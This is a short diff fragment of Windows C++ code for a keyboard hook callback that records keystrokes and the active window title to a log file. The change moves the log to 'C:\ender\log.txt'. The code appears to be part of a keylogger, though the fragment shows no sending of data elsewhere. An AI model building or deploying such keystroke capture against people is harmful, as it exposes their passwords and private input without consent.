@@ -35,7 +35,7 @@ LRESULT CALLBACK KeyBoardHookCallBack(int code, WPARAM wParam, LPARAM lParam)
 			string key;
 			string window;
 			fstream f;
-			f.open("log.txt", ios::app);
+			f.open("C:\\ender\\log.txt", ios::app, _SH_DENYNO);
 
 			HWND Wnd = GetForegroundWindow();
 			char* CurrentWnd = new char[300];
